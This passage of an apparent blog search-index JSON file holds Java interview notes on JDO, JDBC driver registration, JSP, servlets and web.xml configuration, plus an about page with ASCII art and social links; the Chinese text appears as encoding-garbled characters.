æ­¤å¯¹å¼€å‘äººå‘˜æ¥è¯´ï¼Œå­˜å‚¨æ•°æ®å¯¹è±¡å®Œå…¨ä¸éœ€è¦é¢å¤–çš„ä»£ç ï¼ˆå¦‚JDBC APIçš„ä½¿ç”¨ï¼‰ã€‚è¿™äº›ç¹ççš„ä¾‹è¡Œå·¥ä½œå·²ç»è½¬ç§»åˆ°JDOäº§å“æä¾›å•†èº«ä¸Šï¼Œä½¿å¼€å‘äººå‘˜è§£è„±å‡ºæ¥ï¼Œä»è€Œé›†ä¸­æ—¶é—´å’Œç²¾åŠ›åœ¨ä¸šåŠ¡é€»è¾‘ä¸Šã€‚å¦å¤–ï¼ŒJDOå¾ˆçµæ´»ï¼Œå› ä¸ºå®ƒå¯ä»¥åœ¨ä»»ä½•æ•°æ®åº•å±‚ä¸Šè¿è¡Œã€‚JDBCåªæ˜¯é¢å‘å…³ç³»æ•°æ®åº“ï¼ˆRDBMSï¼‰JDOæ›´é€šç”¨ï¼Œæä¾›åˆ°ä»»ä½•æ•°æ®åº•å±‚çš„å­˜å‚¨åŠŸèƒ½ï¼Œæ¯”å¦‚å…³ç³»æ•°æ®åº“ã€æ–‡ä»¶ã€XMLä»¥åŠå¯¹è±¡æ•°æ®åº“ï¼ˆODBMSï¼‰ç­‰ç­‰ï¼Œä½¿å¾—åº”ç”¨å¯ç§»æ¤æ€§æ›´å¼ºã€‚ è°ˆè°ˆJDBCçš„åå°„ï¼Œä»¥åŠå®ƒçš„ä½œç”¨ï¼Ÿé€šè¿‡åå°„com.mysql.jdbc.Driverç±»ï¼Œå®ä¾‹åŒ–è¯¥ç±»çš„æ—¶å€™ä¼šæ‰§è¡Œè¯¥ç±»å†…éƒ¨çš„é™æ€ä»£ç å—ï¼Œè¯¥ä»£ç å—ä¼šåœ¨Javaå®ç°çš„DriverManagerç±»ä¸­æ³¨å†Œè‡ªå·±,DriverManagerç®¡ç†æ‰€æœ‰å·²ç»æ³¨å†Œçš„é©±åŠ¨ç±»ï¼Œå½“è°ƒç”¨DriverManager.geConnectionæ–¹æ³•æ—¶ä¼šéå†è¿™äº›é©±åŠ¨ç±»ï¼Œå¹¶å°è¯•å»è¿æ¥æ•°æ®åº“ï¼Œåªè¦æœ‰ä¸€ä¸ªèƒ½è¿æ¥æˆåŠŸï¼Œå°±è¿”å›Connectionå¯¹è±¡ï¼Œå¦åˆ™åˆ™æŠ¥å¼‚å¸¸ã€‚","categories":[],"tags":[{"name":"Interview","slug":"Interview","permalink":"https://blog.kayleh.top/tags/Interview/"}]},{"title":"contract","slug":"contract","date":"2020-07-15T05:57:44.000Z","updated":"2021-04-11T17:11:28.485Z","comments":true,"path":"contract/","link":"","permalink":"https://blog.kayleh.top/contract/","excerpt":"","text":",-. ,--, ,---, ,--/ /| ,--.&#39;| ,--.&#39; | ,--. :/ | | | : | | : : : &#39; / : : &#39; : : : | &#39; / ,--.--. .--, | &#39; | ,---. : | |,--. &#39; | : / \\ /_ ./| &#39; | | / \\ | : &#39; | | | \\ .--. .-. | , &#39; , &#39; : | | : / / | | | /&#39; : &#39; : |. \\ \\__\\/: . . /___/ \\: | &#39; : |__ . &#39; / | &#39; : | | | | | &#39; \\ \\ ,&quot; .--.; | . \\ &#39; | | | &#39;.&#39;| &#39; ; /| | | &#39; | : &#39; : |--&#39; / / ,. | \\ ; : ; : ; &#39; | / | | : :_:,&#39; ; |,&#39; ; : .&#39; \\ \\ \\ ; | , / | : | | | ,&#39; &#39;--&#39; | , .-./ : \\ \\ ---`-&#39; \\ \\ / `--&#39;&#39; `--`---&#39; \\ &#39; ; `----&#39; `--` æˆ‘æ˜¯ä¸€åä¿å®‰ï¼Œå®‰å…¨ä¸æˆ‘æ— å…³ ä¿å®‰ï¼Ÿä¿æŠ¤ä¸äº†ä»»ä½•äºº Github: https://github.com/Kayleh Google: mailto:kaylehisdied@gmail.com Facebook: https://www.facebook.com/kayleh.yao.7 Twitter: https://twitter.com/y40jinqing Weibo: https://weibo.com/5737136689/profile?rightmod=1&amp;wvr=6&amp;mod=personinfo Zhihu: https://www.zhihu.com/people/ni-hui-gan-xie-wo-de Linkedin: https://www.linkedin.com/in/jinqing-yao-97a750186/ wechat\" style=\"zoom: 33%;","categories":[],"tags":[{"name":"about","slug":"about","permalink":"https://blog.kayleh.top/tags/about/"}]},{"title":"J2EE","slug":"J2EE","date":"2020-07-13T21:44:34.000Z","updated":"2021-04-11T17:11:28.197Z","comments":true,"path":"J2EE/","link":"","permalink":"https://blog.kayleh.top/J2EE/","excerpt":"Java Web","text":"Java Web JAVAåº”ç”¨æœåŠ¡å™¨éƒ½æœ‰é‚£äº›ï¼ŸBEA WebLogic Serverï¼Œ IBM WebSphere Application Serverï¼Œ Oracle9i Application Server jBossï¼Œ Tomcat åœ¨ä»€ä¹ˆæƒ…å†µä¸‹å›ä½¿ç”¨assertï¼Ÿassertion (æ–­è¨€)åœ¨è½¯ä»¶å¼€å‘ä¸­æ˜¯ä¸€ç§å¸¸ç”¨çš„è°ƒè¯•æ–¹å¼ï¼Œå¾ˆå¤šå¼€å‘è¯­è¨€ä¸­éƒ½æ”¯æŒè¿™ç§æœºåˆ¶ã€‚åœ¨å®ç°ä¸­ï¼Œassertionå°±æ˜¯åœ¨ç¨‹åºä¸­çš„ä¸€æ¡è¯­å¥ï¼Œå®ƒå¯¹ä¸€ä¸ª booleanè¡¨è¾¾å¼è¿›è¡Œæ£€æŸ¥ï¼Œä¸€ä¸ªæ­£ç¡®ç¨‹åºå¿…é¡»ä¿è¯è¿™ä¸ªbooleanè¡¨è¾¾å¼çš„å€¼ä¸ºtrueï¼›å¦‚æœè¯¥å€¼ä¸ºfalseï¼Œè¯´æ˜ç¨‹åºå·²ç»å¤„äºä¸æ­£ç¡®çš„çŠ¶æ€ä¸‹ï¼Œç³»ç»Ÿå°†ç»™å‡ºè­¦å‘Šæˆ–é€€å‡ºã€‚ä¸€èˆ¬æ¥è¯´ï¼Œassertionç”¨äºä¿è¯ç¨‹åºæœ€åŸºæœ¬ã€å…³é”®çš„æ­£ç¡®æ€§ã€‚assertionæ£€æŸ¥é€šå¸¸åœ¨å¼€å‘å’Œæµ‹è¯•æ—¶å¼€å¯ã€‚ä¸ºäº†æé«˜æ€§èƒ½ï¼Œåœ¨è½¯ä»¶å‘å¸ƒåï¼Œassertionæ£€æŸ¥é€šå¸¸æ˜¯å…³é—­çš„ã€‚ 1åˆ†é’Ÿä¹‹å†…åªèƒ½å¤„ç†1000ä¸ªè¯·æ±‚ï¼Œä½ æ€ä¹ˆå®ç°ï¼Œæ‰‹æ’•ä»£ç ? é™æµçš„å‡ ç§æ–¹æ³•ï¼šè®¡æ•°å™¨ï¼Œæ»‘åŠ¨çª—å£ã€æ¼æ¡¶æ³•ã€ä»¤ç‰Œæ¡¶ å¦‚ä½•åœ¨é“¾æ¥é‡Œä¸è¾“å…¥é¡¹ç›®åç§°çš„æƒ…å†µä¸‹å¯åŠ¨é¡¹ç›®ï¼Ÿ å¯åœ¨taomcaté…ç½®è™šæ‹Ÿç›®å½•ã€‚ è¯´æ˜ä¸€ä¸‹JSPä¸­çš„é™æ€åŒ…å«å’ŒåŠ¨æ€åŒ…å«çš„æœ‰å“ªäº›åŒºåˆ«ï¼Ÿé™æ€åŒ…å«æ˜¯é€šè¿‡JSPçš„includeæŒ‡ä»¤åŒ…å«é¡µé¢ï¼ŒåŠ¨æ€åŒ…å«æ˜¯é€šè¿‡JSPæ ‡å‡†åŠ¨ä½œåŒ…å«é¡µé¢ã€‚é™æ€åŒ…å«æ˜¯ç¼–è¯‘æ—¶åŒ…å«ï¼Œå¦‚æœåŒ…å«çš„é¡µé¢ä¸å­˜åœ¨åˆ™ä¼šäº§ç”Ÿç¼–è¯‘é”™è¯¯ï¼Œè€Œä¸”ä¸¤ä¸ªé¡µé¢çš„â€contentTypeâ€å±æ€§åº”ä¿æŒä¸€è‡´ï¼Œå› ä¸ºä¸¤ä¸ªé¡µé¢ä¼šåˆäºŒä¸ºä¸€ï¼Œåªäº§ç”Ÿä¸€ä¸ªclassæ–‡ä»¶ï¼Œå› æ­¤è¢«åŒ…å«é¡µé¢å‘ç”Ÿçš„å˜åŠ¨å†åŒ…å«å®ƒçš„é¡µé¢æ›´æ–°å‰ä¸ä¼šå¾—åˆ°æ›´æ–°ã€‚åŠ¨æ€åŒ…å«æ˜¯è¿è¡Œæ—¶åŒ…å«ï¼Œå¯ä»¥å‘è¢«åŒ…å«çš„é¡µé¢ä¼ é€’å‚æ•°ï¼ŒåŒ…å«é¡µé¢å’Œè¢«åŒ…å«é¡µé¢æ˜¯ç‹¬ç«‹çš„ï¼Œä¼šç¼–è¯‘å‡ºä¸¤ä¸ªclassæ–‡ä»¶ï¼Œå¦‚æœè¢«åŒ…å«çš„é¡µé¢ä¸å­˜åœ¨ï¼Œä¸ä¼šäº§ç”Ÿç¼–è¯‘é”™è¯¯ï¼Œä¹Ÿä¸å½±å“é¡µé¢å…¶ä»–éƒ¨åˆ†çš„æ‰§è¡Œã€‚ ä¾‹å¦‚ï¼š &lt;%â€” é™æ€åŒ…å« â€”%&gt;&lt;%@ include file=â€â€¦â€ %&gt; &lt;%â€” åŠ¨æ€åŒ…å« â€”%&gt; &lt;&lt;/jsp:include&gt;&gt; è¯·è¯´ä¸€ä¸‹è¡¨è¾¾å¼è¯­è¨€ï¼ˆELï¼‰çš„éšå¼å¯¹è±¡ä»¥åŠè¯¥å¯¹è±¡çš„ä½œç”¨ELçš„éšå¼å¯¹è±¡åŒ…æ‹¬ï¼špageContextã€initParamï¼ˆè®¿é—®ä¸Šä¸‹æ–‡å‚æ•°ï¼‰ã€paramï¼ˆè®¿é—®è¯·æ±‚å‚æ•°ï¼‰ã€paramValuesã€headerï¼ˆè®¿é—®è¯·æ±‚å¤´ï¼‰ã€headerValuesã€cookieï¼ˆè®¿é—®cookieï¼‰ã€applicationScopeï¼ˆè®¿é—®applicationä½œç”¨åŸŸï¼‰ã€sessionScopeï¼ˆè®¿é—®sessionä½œç”¨åŸŸï¼‰ã€requestScopeï¼ˆè®¿é—®requestä½œç”¨åŸŸï¼‰ã€pageScopeï¼ˆè®¿é—®pageä½œç”¨åŸŸï¼‰ã€‚ è°ˆä¸€è°ˆJSPæœ‰å“ªäº›å†…ç½®å¯¹è±¡ï¼Ÿä»¥åŠè¿™äº›å¯¹è±¡çš„ä½œç”¨åˆ†åˆ«æ˜¯ä»€ä¹ˆï¼ŸJSPæœ‰9ä¸ªå†…ç½®å¯¹è±¡ï¼š- requestï¼šå°è£…å®¢æˆ·ç«¯çš„è¯·æ±‚ï¼Œå…¶ä¸­åŒ…å«æ¥è‡ªGETæˆ–POSTè¯·æ±‚çš„å‚æ•°ï¼›- responseï¼šå°è£…æœåŠ¡å™¨å¯¹å®¢æˆ·ç«¯çš„å“åº”ï¼›- pageContextï¼šé€šè¿‡è¯¥å¯¹è±¡å¯ä»¥è·å–å…¶ä»–å¯¹è±¡ï¼›- sessionï¼šå°è£…ç”¨æˆ·ä¼šè¯çš„å¯¹è±¡ï¼›- applicationï¼šå°è£…æœåŠ¡å™¨è¿è¡Œç¯å¢ƒçš„å¯¹è±¡ï¼›- outï¼šè¾“å‡ºæœåŠ¡å™¨å“åº”çš„è¾“å‡ºæµå¯¹è±¡ï¼›- configï¼šWebåº”ç”¨çš„é…ç½®å¯¹è±¡ï¼›- pageï¼šJSPé¡µé¢æœ¬èº«ï¼ˆç›¸å½“äºJavaç¨‹åºä¸­çš„thisï¼‰ï¼›- exceptionï¼šå°è£…é¡µé¢æŠ›å‡ºå¼‚å¸¸çš„å¯¹è±¡ã€‚ å¦‚æœç”¨Servletæ¥ç”Ÿæˆç½‘é¡µä¸­çš„åŠ¨æ€å†…å®¹æ— ç–‘æ˜¯éå¸¸ç¹ççš„å·¥ä½œï¼Œå¦ä¸€æ–¹é¢ï¼Œæ‰€æœ‰çš„æ–‡æœ¬å’ŒHTMLæ ‡ç­¾éƒ½æ˜¯ç¡¬ç¼–ç ï¼Œå³ä½¿åšå‡ºå¾®å°çš„ä¿®æ”¹ï¼Œéƒ½éœ€è¦è¿›è¡Œé‡æ–°ç¼–è¯‘ã€‚JSPè§£å†³äº†Servletçš„è¿™äº›é—®é¢˜ï¼Œå®ƒæ˜¯Servletå¾ˆå¥½çš„è¡¥å……ï¼Œå¯ä»¥ä¸“é—¨ç”¨ä½œä¸ºç”¨æˆ·å‘ˆç°è§†å›¾ï¼ˆViewï¼‰ï¼Œè€ŒServletä½œä¸ºæ§åˆ¶å™¨ï¼ˆControllerï¼‰ä¸“é—¨è´Ÿè´£å¤„ç†ç”¨æˆ·è¯·æ±‚å¹¶è½¬å‘æˆ–é‡å®šå‘åˆ°æŸä¸ªé¡µé¢ã€‚åŸºäºJavaçš„Webå¼€å‘å¾ˆå¤šéƒ½åŒæ—¶ä½¿ç”¨äº†Servletå’ŒJSPã€‚JSPé¡µé¢å…¶å®æ˜¯ä¸€ä¸ªServletï¼Œèƒ½å¤Ÿè¿è¡ŒServletçš„æœåŠ¡å™¨ï¼ˆServletå®¹å™¨ï¼‰é€šå¸¸ä¹Ÿæ˜¯JSPå®¹å™¨ï¼Œå¯ä»¥æä¾›JSPé¡µé¢çš„è¿è¡Œç¯å¢ƒï¼ŒTomcatå°±æ˜¯ä¸€ä¸ªServlet/JSPå®¹å™¨ã€‚ç¬¬ä¸€æ¬¡è¯·æ±‚ä¸€ä¸ªJSPé¡µé¢æ—¶ï¼ŒServlet/JSPå®¹å™¨é¦–å…ˆå°†JSPé¡µé¢è½¬æ¢æˆä¸€ä¸ªJSPé¡µé¢çš„å®ç°ç±»ï¼Œè¿™æ˜¯ä¸€ä¸ªå®ç°äº†JspPageæ¥å£æˆ–å…¶å­æ¥å£HttpJspPageçš„Javaç±»ã€‚JspPageæ¥å£æ˜¯Servletçš„å­æ¥å£ï¼Œå› æ­¤æ¯ä¸ªJSPé¡µé¢éƒ½æ˜¯ä¸€ä¸ªServletã€‚è½¬æ¢æˆåŠŸåï¼Œå®¹å™¨ä¼šç¼–è¯‘Servletç±»ï¼Œä¹‹åå®¹å™¨åŠ è½½å’Œå®ä¾‹åŒ–Javaå­—èŠ‚ç ï¼Œå¹¶æ‰§è¡Œå®ƒé€šå¸¸å¯¹Servletæ‰€åšçš„ç”Ÿå‘½å‘¨æœŸæ“ä½œã€‚å¯¹åŒä¸€ä¸ªJSPé¡µé¢çš„åç»­è¯·æ±‚ï¼Œå®¹å™¨ä¼šæŸ¥çœ‹è¿™ä¸ªJSPé¡µé¢æ˜¯å¦è¢«ä¿®æ”¹è¿‡ï¼Œå¦‚æœä¿®æ”¹è¿‡å°±ä¼šé‡æ–°è½¬æ¢å¹¶é‡æ–°ç¼–è¯‘å¹¶æ‰§è¡Œã€‚å¦‚æœæ²¡æœ‰åˆ™æ‰§è¡Œå†…å­˜ä¸­å·²ç»å­˜åœ¨çš„Servletå®ä¾‹ã€‚ è¯´è¯´weblogicä¸­ä¸€ä¸ªDomainçš„ç¼ºçœç›®å½•ç»“æ„?æ¯”å¦‚è¦å°†ä¸€ä¸ªç®€å•çš„helloWorld.jspæ”¾å…¥ä½•ç›®å½•ä¸‹,ç„¶ååœ¨æµè§ˆå™¨ä¸Šå°±å¯æ‰“å…¥ä¸»æœºï¼Ÿç«¯å£å·//helloword.jspå°±å¯ä»¥çœ‹åˆ°è¿è¡Œç»“æœäº†? åˆæ¯”å¦‚è¿™å…¶ä¸­ç”¨åˆ°äº†ä¸€ä¸ªè‡ªå·±å†™çš„javaBeanè¯¥å¦‚ä½•åŠ?Domain ç›®å½•æœåŠ¡å™¨ç›®å½•applicationsï¼Œå°†åº”ç”¨ç›®å½•æ”¾åœ¨æ­¤ç›®å½•ä¸‹å°†å¯ä»¥ä½œä¸ºåº”ç”¨è®¿é—®ï¼Œå¦‚æœæ˜¯Webåº”ç”¨ï¼Œåº”ç”¨ç›®å½•éœ€è¦æ»¡è¶³Webåº”ç”¨ç›®å½•è¦æ±‚ï¼Œjspæ–‡ä»¶å¯ä»¥ç›´æ¥æ”¾åœ¨åº”ç”¨ç›®å½•ä¸­ï¼ŒJavabeanéœ€è¦æ”¾åœ¨åº”ç”¨ç›®å½•çš„WEB-INFç›®å½•çš„classesç›®å½•ä¸­ï¼Œè®¾ç½®æœåŠ¡å™¨çš„ç¼ºçœåº”ç”¨å°†å¯ä»¥å®ç°åœ¨æµè§ˆå™¨ä¸Šæ— éœ€è¾“å…¥åº”ç”¨åã€‚ è¯·è¯´æ˜ä¸€ä¸‹jspæœ‰å“ªäº›åŠ¨ä½œ? è¿™äº›åŠ¨ä½œçš„ä½œç”¨åˆåˆ†åˆ«æ˜¯ä»€ä¹ˆ?JSP å…±æœ‰ä»¥ä¸‹6ç§åŸºæœ¬åŠ¨ä½œ jsp:includeï¼šåœ¨é¡µé¢è¢«è¯·æ±‚çš„æ—¶å€™å¼•å…¥ä¸€ä¸ªæ–‡ä»¶ã€‚ jsp:useBeanï¼šå¯»æ‰¾æˆ–è€…å®ä¾‹åŒ–ä¸€ä¸ªJavaBeanã€‚jsp:setPropertyï¼šè®¾ç½®JavaBeançš„å±æ€§ã€‚ jsp:getPropertyï¼šè¾“å‡ºæŸä¸ªJavaBeançš„å±æ€§ã€‚ jsp:forwardï¼šæŠŠè¯·æ±‚è½¬åˆ°ä¸€ä¸ªæ–°çš„é¡µé¢ã€‚ jsp:pluginï¼šæ ¹æ®æµè§ˆå™¨ç±»å‹ä¸ºJavaæ’ä»¶ç”ŸæˆOBJECTæˆ–EMBEDæ ‡è®°ã€‚ è¯¦ç»†è¯´æ˜ä¸€ä¸‹Requestå¯¹è±¡çš„ä¸»è¦æ–¹æ³•æ˜¯ä»€ä¹ˆï¼Ÿ setAttribute(String name,Object)ï¼šè®¾ç½®åå­—ä¸ºnameçš„requestçš„å‚æ•°å€¼getAttribute(String name)ï¼šè¿”å›ç”±nameæŒ‡å®šçš„å±æ€§å€¼getAttributeNames()ï¼šè¿”å›requestå¯¹è±¡æ‰€æœ‰å±æ€§çš„åå­—é›†åˆï¼Œç»“æœæ˜¯ä¸€ä¸ªæšä¸¾çš„å®ä¾‹getCookies()ï¼šè¿”å›å®¢æˆ·ç«¯çš„æ‰€æœ‰Cookieå¯¹è±¡ï¼Œç»“æœæ˜¯ä¸€ä¸ªCookieæ•°ç»„getCharacterEncoding()ï¼šè¿”å›è¯·æ±‚ä¸­çš„å­—ç¬¦ç¼–ç æ–¹å¼getContentLength()ï¼šè¿”å›è¯·æ±‚çš„Bodyçš„é•¿åº¦getHeader(String name)ï¼šè·å¾—HTTPåè®®å®šä¹‰çš„æ–‡ä»¶å¤´ä¿¡æ¯getHeaders(String name)ï¼šè¿”å›æŒ‡å®šåå­—çš„request Headerçš„æ‰€æœ‰å€¼ï¼Œç»“æœæ˜¯ä¸€ä¸ªæšä¸¾çš„å®ä¾‹getHeaderNames()ï¼šè¿”å›æ‰€ä»¥request Headerçš„åå­—ï¼Œç»“æœæ˜¯ä¸€ä¸ªæšä¸¾çš„å®ä¾‹getInputStream()ï¼šè¿”å›è¯·æ±‚çš„è¾“å…¥æµï¼Œç”¨äºè·å¾—è¯·æ±‚ä¸­çš„æ•°æ®getMethod()ï¼šè·å¾—å®¢æˆ·ç«¯å‘æœåŠ¡å™¨ç«¯ä¼ é€æ•°æ®çš„æ–¹æ³•getParameter(String name)ï¼šè·å¾—å®¢æˆ·ç«¯ä¼ é€ç»™æœåŠ¡å™¨ç«¯çš„æœ‰nameæŒ‡å®šçš„å‚æ•°å€¼getParameterNames()ï¼šè·å¾—å®¢æˆ·ç«¯ä¼ é€ç»™æœåŠ¡å™¨ç«¯çš„æ‰€æœ‰å‚æ•°çš„åå­—ï¼Œç»“æœæ˜¯ä¸€ä¸ªæšä¸¾çš„å®ä¾‹getParameterValues(String name)ï¼šè·å¾—æœ‰nameæŒ‡å®šçš„å‚æ•°çš„æ‰€æœ‰å€¼getProtocol()ï¼šè·å–å®¢æˆ·ç«¯å‘æœåŠ¡å™¨ç«¯ä¼ é€æ•°æ®æ‰€ä¾æ®çš„åè®®åç§°getQueryString()ï¼šè·å¾—æŸ¥è¯¢å­—ç¬¦ä¸²getRequestURI()ï¼šè·å–å‘å‡ºè¯·æ±‚å­—ç¬¦ä¸²çš„å®¢æˆ·ç«¯åœ°å€getRemoteAddr()ï¼šè·å–å®¢æˆ·ç«¯çš„IPåœ°å€getRemoteHost()ï¼šè·å–å®¢æˆ·ç«¯çš„åå­—getSession([Boolean create])ï¼šè¿”å›å’Œè¯·æ±‚ç›¸å…³SessiongetServerName()ï¼šè·å–æœåŠ¡å™¨çš„åå­—getServletPath()ï¼šè·å–å®¢æˆ·ç«¯æ‰€è¯·æ±‚çš„è„šæœ¬æ–‡ä»¶çš„è·¯å¾„getServerPort()ï¼šè·å–æœåŠ¡å™¨çš„ç«¯å£å·removeAttribute(String name)ï¼šåˆ é™¤è¯·æ±‚ä¸­çš„ä¸€ä¸ªå±æ€§ è¯·ç®€è¦è¯´æ˜ä¸€ä¸‹å››ç§ä¼šè¯è·Ÿè¸ªæŠ€æœ¯åˆ†åˆ«æ˜¯ä»€ä¹ˆï¼Ÿä¼šè¯ä½œç”¨åŸŸServletsJSP é¡µé¢æè¿°pageå¦æ˜¯ä»£è¡¨ä¸ä¸€ä¸ªé¡µé¢ç›¸å…³çš„å¯¹è±¡å’Œå±æ€§ã€‚ä¸€ä¸ªé¡µé¢ç”±ä¸€ä¸ªç¼–è¯‘å¥½çš„ Java servlet ç±»ï¼ˆå¯ä»¥å¸¦æœ‰ä»»ä½•çš„ include æŒ‡ä»¤ï¼Œä½†æ˜¯æ²¡æœ‰ include åŠ¨ä½œï¼‰è¡¨ç¤ºã€‚è¿™æ—¢åŒ…æ‹¬ servlet åˆåŒ…æ‹¬è¢«ç¼–è¯‘æˆ servlet çš„ JSP é¡µé¢requestæ˜¯æ˜¯ä»£è¡¨ä¸ Web å®¢æˆ·æœºå‘å‡ºçš„ä¸€ä¸ªè¯·æ±‚ç›¸å…³çš„å¯¹è±¡å’Œå±æ€§ã€‚ä¸€ä¸ªè¯·æ±‚å¯èƒ½è·¨è¶Šå¤šä¸ªé¡µé¢ï¼Œæ¶‰åŠå¤šä¸ª Web ç»„ä»¶ï¼ˆç”±äºforward æŒ‡ä»¤å’Œ include åŠ¨ä½œçš„å…³ç³»ï¼‰sessionæ˜¯æ˜¯ä»£è¡¨ä¸ç”¨äºæŸä¸ª Web å®¢æˆ·æœºçš„ä¸€ä¸ªç”¨æˆ·ä½“éªŒç›¸å…³çš„å¯¹è±¡å’Œå±æ€§ã€‚ä¸€ä¸ª Web ä¼šè¯å¯ä»¥ä¹Ÿç»å¸¸ä¼šè·¨è¶Šå¤šä¸ªå®¢æˆ·æœºè¯·æ±‚applicationæ˜¯æ˜¯ä»£è¡¨ä¸æ•´ä¸ª Web åº”ç”¨ç¨‹åºç›¸å…³çš„å¯¹è±¡å’Œå±æ€§ã€‚è¿™å®è´¨ä¸Šæ˜¯è·¨è¶Šæ•´ä¸ª Web åº”ç”¨ç¨‹åºï¼ŒåŒ…æ‹¬å¤šä¸ªé¡µé¢ã€è¯·æ±‚å’Œä¼šè¯çš„ä¸€ä¸ªå…¨å±€ä½œç”¨åŸŸã€‚ è¯·ç®€è¦è¯´æ˜ä¸€ä¸‹JSPå’ŒServletæœ‰å“ªäº›ç›¸åŒç‚¹å’Œä¸åŒç‚¹ï¼Ÿå¦å¤–ä»–ä»¬ä¹‹é—´çš„è”ç³»åˆæ˜¯ä»€ä¹ˆå‘¢ï¼ŸJSP æ˜¯ServletæŠ€æœ¯çš„æ‰©å±•ï¼Œæœ¬è´¨ä¸Šæ˜¯Servletçš„ç®€æ˜“æ–¹å¼ï¼Œæ›´å¼ºè°ƒåº”ç”¨çš„å¤–è¡¨è¡¨è¾¾ã€‚JSPç¼–è¯‘åæ˜¯â€ç±»servletâ€ã€‚Servletå’ŒJSPæœ€ä¸»è¦çš„ä¸åŒç‚¹åœ¨äºï¼ŒServletçš„åº”ç”¨é€»è¾‘æ˜¯åœ¨Javaæ–‡ä»¶ä¸­ï¼Œå¹¶ä¸”å®Œå…¨ä»è¡¨ç¤ºå±‚ä¸­çš„HTMLé‡Œåˆ†ç¦»å¼€æ¥ã€‚è€ŒJSPçš„æƒ…å†µæ˜¯Javaå’ŒHTMLå¯ä»¥ç»„åˆæˆä¸€ä¸ªæ‰©å±•åä¸º.jspçš„æ–‡ä»¶ã€‚JSPä¾§é‡äºè§†å›¾ï¼ŒServletä¸»è¦ç”¨äºæ§åˆ¶é€»è¾‘ è¯·è¯´æ˜ä¸€ä¸‹JSPçš„å†…ç½®å¯¹è±¡ä»¥åŠè¯¥å¯¹è±¡çš„ä½¿ç”¨æ–¹æ³•ã€‚ requestè¡¨ç¤ºHttpServletRequestå¯¹è±¡ã€‚å®ƒåŒ…å«äº†æœ‰å…³æµè§ˆå™¨è¯·æ±‚çš„ä¿¡æ¯ï¼Œå¹¶ä¸”æä¾›äº†å‡ ä¸ªç”¨äºè·å–cookie, header, å’Œsessionæ•°æ®çš„æœ‰ç”¨çš„æ–¹æ³•ã€‚responseè¡¨ç¤ºHttpServletResponseå¯¹è±¡ï¼Œå¹¶æä¾›äº†å‡ ä¸ªç”¨äºè®¾ç½®é€å›æµè§ˆå™¨çš„å“åº”çš„æ–¹æ³•ï¼ˆå¦‚cookies,å¤´ä¿¡æ¯ç­‰ï¼‰outå¯¹è±¡æ˜¯javax.jsp.JspWriterçš„ä¸€ä¸ªå®ä¾‹ï¼Œå¹¶æä¾›äº†å‡ ä¸ªæ–¹æ³•ä½¿ä½ èƒ½ç”¨äºå‘æµè§ˆå™¨å›é€è¾“å‡ºç»“æœã€‚pageContextè¡¨ç¤ºä¸€ä¸ªjavax.servlet.jsp.PageContextå¯¹è±¡ã€‚å®ƒæ˜¯ç”¨äºæ–¹ä¾¿å­˜å–å„ç§èŒƒå›´çš„åå­—ç©ºé—´ã€servletç›¸å…³çš„å¯¹è±¡çš„APIï¼Œå¹¶ä¸”åŒ…è£…äº†é€šç”¨çš„servletç›¸å…³åŠŸèƒ½çš„æ–¹æ³•ã€‚sessionè¡¨ç¤ºä¸€ä¸ªè¯·æ±‚çš„javax.servlet.http.HttpSessionå¯¹è±¡ã€‚Sessionå¯ä»¥å­˜è´®ç”¨æˆ·çš„çŠ¶æ€ä¿¡æ¯applicaton è¡¨ç¤ºä¸€ä¸ªjavax.servle.ServletContextå¯¹è±¡ã€‚è¿™æœ‰åŠ©äºæŸ¥æ‰¾æœ‰å…³servletå¼•æ“å’Œservletç¯å¢ƒçš„ä¿¡æ¯configè¡¨ç¤ºä¸€ä¸ªjavax.servlet.ServletConfigå¯¹è±¡ã€‚è¯¥å¯¹è±¡ç”¨äºå­˜å–servletå®ä¾‹çš„åˆå§‹åŒ–å‚æ•°ã€‚pageè¡¨ç¤ºä»è¯¥é¡µé¢äº§ç”Ÿçš„ä¸€ä¸ªservletå®ä¾‹ è¯·è¯´æ˜ä¸€ä¸‹web.xmlæ–‡ä»¶ä¸­å¯ä»¥é…ç½®å“ªäº›å†…å®¹ï¼Ÿ web.xmlç”¨äºé…ç½®Webåº”ç”¨çš„ç›¸å…³ä¿¡æ¯ï¼Œå¦‚ï¼šç›‘å¬å™¨ï¼ˆlistenerï¼‰ã€è¿‡æ»¤å™¨ï¼ˆfilterï¼‰ã€ Servletã€ç›¸å…³å‚æ•°ã€ä¼šè¯è¶…æ—¶æ—¶é—´ã€å®‰å…¨éªŒè¯æ–¹å¼ã€é”™è¯¯é¡µé¢ç­‰ï¼Œä¸‹é¢æ˜¯ä¸€äº›å¼€å‘ä¸­å¸¸è§çš„é…ç½®ï¼š â‘ é…ç½®Springä¸Šä¸‹æ–‡åŠ è½½ç›‘å¬å™¨åŠ è½½Springé…ç½®æ–‡ä»¶å¹¶åˆ›å»ºIoCå®¹å™¨ï¼š contextConfigLocation&lt;/param-name&gt; classpath:applicationContext.xml&lt;/param-value&gt;&lt;/context-param&gt; org.springframework.web.context.ContextLoaderListener â‘¡é…ç½®Springçš„OpenSessionInViewè¿‡æ»¤å™¨æ¥è§£å†³å»¶è¿ŸåŠ è½½å’ŒHibernateä¼šè¯å…³é—­çš„çŸ›ç›¾ï¼š openSessionInView org.springframework.orm.hibernate3.support.OpenSessionInViewFilter openSessionInView&lt;/filter-name&gt; /*&lt;/url-pattern&gt;&lt;/filter-mapping&gt; â‘¢é…ç½®ä¼šè¯è¶…æ—¶æ—¶é—´ä¸º10åˆ†é’Ÿï¼š 10&lt;/session-timeout&gt;&lt;/session-config&gt; â‘£é…ç½®404å’ŒExceptionçš„é”™è¯¯é¡µé¢ï¼š 404&lt;/error-code&gt; /error.jsp&lt;/error-page&gt; java.lang.Exception&lt;/exception-type&gt; /error.jsp&lt;/error-page&gt;â‘¤é…ç½®å®‰å…¨è®¤è¯æ–¹å¼ï¼š ProtectedArea&lt;/web-resource-name&gt; /admin/*&lt;/url-pattern&gt; GET&lt;/http-method&gt; POST&lt;/http-method&gt;&lt;/web-resource-collection&gt; admin&lt;/role-name&gt;&lt;/auth-constraint&gt;&lt;/security-constraint&gt; BASIC&lt;/auth-method&gt;&lt;/login-config&gt; admin&lt;/role-name&gt;&lt;/security-role&gt; è°ˆè°ˆä½ å¯¹Javawebå¼€å‘ä¸­çš„ç›‘å¬å™¨çš„ç†è§£ï¼ŸJava Webå¼€å‘ä¸­çš„ç›‘å¬å™¨ï¼ˆlistenerï¼‰å°±æ˜¯applicationã€sessionã€requestä¸‰ä¸ªå¯¹è±¡åˆ›å»ºã€é”€æ¯æˆ–è€…å¾€å…¶ä¸­æ·»åŠ 